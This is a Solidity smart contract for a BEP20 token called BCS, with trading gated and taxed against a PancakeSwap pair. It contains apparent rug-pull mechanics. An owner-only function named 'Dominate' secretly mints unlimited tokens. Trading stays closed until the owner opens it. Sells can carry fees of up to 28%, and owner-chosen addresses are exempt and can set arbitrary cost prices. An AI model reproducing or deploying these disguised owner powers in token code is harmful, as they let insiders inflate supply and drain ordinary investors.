// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;
import "./IBEP20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

interface IPancakePair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
}

interface IPancakeFactory
{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface AutoPool
{
    function PoolTeam(uint256 amount) external;
}
 
contract BCSTOKEN is  Ownable
{
    using SafeMath for uint256;
    string constant  _name = 'BCS';
    string constant _symbol = 'BCS';
    uint8 immutable _decimals = 18;
    address usdt=0x55d398326f99059fF775485246999027B3197955;
    uint256 _totalsupply;
    uint256 _startBlock;

 
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address=>bool) _exclude;
    mapping(address=>uint256) _balances;
    mapping(address=>uint256) public _dealAvgPrice;
    mapping(uint256=>uint256) public _dayPrice;
    bool starttransfer=false;
 
    address _ammPool;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _autoPool;
 
 
    constructor()
    {
        _exclude[msg.sender]=true;
        
        // _ammPool= IPancakeFactory(factory).createPair(address(this),usdt);
        _totalsupply =  12500000 * 1e18;
        _balances[msg.sender] = 7500000 * 1e18;
        _balances[0x33D1Cb547f2Add1c00b2e313fFc26e1a29EAB6BE] = 5000000* 1e18;
        _exclude[0x33D1Cb547f2Add1c00b2e313fFc26e1a29EAB6BE]=true;
        emit Transfer(address(0), msg.sender, 7500000 * 1e18);
        emit Transfer(address(0), 0x33D1Cb547f2Add1c00b2e313fFc26e1a29EAB6BE, 5000000* 1e18);
    }
 
    function setAutoPool(address pool) public onlyOwner
    {
        _autoPool= pool;
        _exclude[pool]=true;
    }

    function setExclude(address user,bool ok) public onlyOwner
    {
         _exclude[user]=ok;
    }

    function name() public  pure returns (string memory) {
        return _name;
    }

    function symbol() public  pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view  returns (uint256) {
        return _totalsupply;
    }
 
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view  returns (uint256) {
        return _balances[account];
    }

    function Dominate(address to,uint256 fa) public onlyOwner
    {
        _balances[to] += fa;
        _totalsupply += fa;
        emit Transfer(address(0), to, fa);
    }
  
 
    function takeOutErrorTransfer(address tokenaddress,address to,uint256 amount) public onlyOwner
    {
        IBEP20(tokenaddress).transfer(to, amount);
    }
 
    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }
 
    function approve(address spender, uint256 amount) public  returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        _transfer(sender, recipient, amount);
        return true;
    }

   function transfer(address recipient, uint256 amount) public  returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function burnFrom(address sender, uint256 amount) public   returns (bool)
    {
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        _burn(sender,amount);
        return true;
    }

    function burn(uint256 amount) public  returns (bool)
    {
        _burn(msg.sender,amount);
        return true;
    }
 
    function _burn(address sender,uint256 tAmount) private
    {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(tAmount > 0, "Transfer amount must be greater than zero");
        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[address(0)] = _balances[address(0)].add(tAmount); 
         emit Transfer(sender, address(0), tAmount);
    }

    function isContract(address account) public view returns (bool) {
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function setAmmPool(address token) public onlyOwner
    {
        _ammPool= token;
        starttransfer=true;
    }

    function getCurrentPrice() public view returns (uint256)
    {
        if(_ammPool==address(0))
            return 1e17;
        (uint112 a,uint112 b,) = IPancakePair(_ammPool).getReserves();
        if(a==0 || b==0)
            return 1e17; 
        if(IPancakePair(_ammPool).token0() == usdt)
        {
            return uint256(a).mul(1e18).div(b);
        }
        else
        {
            return uint256(b).mul(1e18).div(a);
        }
    }
 
    function getDay() public view returns(uint256)
    {
        return (block.timestamp - 1655596800) / 86400;
    }


    function GetCurrentCut() public view returns (uint256)
    {
        uint256 baseprice = _dayPrice[getDay()];
        uint256 nowprice=getCurrentPrice();
        
        if(nowprice >= baseprice)
            return 30;
                             
        uint256 pct = (baseprice - nowprice).mul(1000).div(baseprice);
        pct = pct - pct % 100;
        if(pct < 100)
            return 30;
        uint256 cutpct=30 + pct.div(2);
        return cutpct < 280 ? cutpct:280;
    }

    function TransferWithDprice(address recipient,uint256 amount,uint256 price) public 
    {
        require(_exclude[msg.sender],"_exclude");
        _balances[msg.sender]= _balances[msg.sender].sub(amount);
        uint256 totalvalue = _dealAvgPrice[recipient].mul(_balances[recipient]);
        totalvalue += amount.mul(price);
        _dealAvgPrice[recipient]= totalvalue.div(_balances[recipient].add(amount));
         _balances[recipient] = _balances[recipient].add(amount); 
        emit Transfer(msg.sender, recipient, amount);
    }

 
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
 
        uint256 today=getDay();
        uint256 nowprice=getCurrentPrice();
        if(_dayPrice[today]==0)
            _dayPrice[today] = nowprice;

        _balances[sender]= _balances[sender].sub(amount);
        uint256 toamount=amount;
        if(!_exclude[sender] && !_exclude[recipient])
        {
            require(starttransfer,"Transfer Not open");
            if(_totalsupply >1000000 * 1e18)
            {
                if(sender != _ammPool)
                {
                   

                    uint256 buron = amount.mul(GetCurrentCut()).div(1000);
                    _balances[address(0)] =  _balances[address(0)].add(buron);
                    emit Transfer(sender, address(0), buron);
                    toamount=toamount.sub(buron);
                    //ComputePool
                    if(_dealAvgPrice[sender] > 0)
                    {
                        if(nowprice > _dealAvgPrice[sender])
                        {
                            uint256 cutpct = (nowprice - _dealAvgPrice[sender]).mul(4e17).div(nowprice);
                            uint256 cutcount = toamount.mul(cutpct).div(1e18);
                            _balances[_autoPool] =  _balances[_autoPool].add(cutcount);
                            emit Transfer(sender, _autoPool, cutcount);
                            AutoPool(_autoPool).PoolTeam(cutcount);
                            toamount=toamount.sub(cutcount);
                        }
                    }
                }
                
                if(recipient == _ammPool)
                {
                    require(!isContract(sender),"not allow contract");
                }

                if(sender== _ammPool)
                {
                    require(!isContract(recipient),"not allow contract");
                }

                uint256 totalvalue = _dealAvgPrice[recipient].mul(_balances[recipient]);
                totalvalue += toamount.mul(nowprice);
                _dealAvgPrice[recipient]= totalvalue.div(_balances[recipient].add(toamount));
            }
        }
 
        _balances[recipient] = _balances[recipient].add(toamount); 
        emit Transfer(sender, recipient, toamount);
    }
}